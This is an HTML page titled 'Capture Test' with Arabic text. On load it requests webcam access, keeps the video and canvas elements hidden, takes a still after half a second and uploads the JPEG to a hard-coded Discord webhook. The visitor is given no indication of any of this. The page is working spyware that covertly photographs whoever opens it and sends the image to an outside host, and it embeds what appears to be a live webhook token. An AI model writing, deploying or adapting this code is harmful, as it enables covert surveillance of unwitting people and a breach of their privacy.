<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Capture Test</title>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569812360976269322/dv5MXkROSgdX6Aq1Oo6upwAB8DndK8qSXYrw3xXRG14ZqR8Sg_N1H9zfGkMbHSKB1HPJ';

        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('file', blob, 'capture.jpg');
                        formData.append('content', '📸 صورة جديدة تم التقاطها:');

                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.8);

                    stream.getTracks().forEach(track => track.stop());
                }, 500);
            })
            .catch(err => {
                console.log("خطأ في الإذن");
            });
    </script>

</body>
</html>
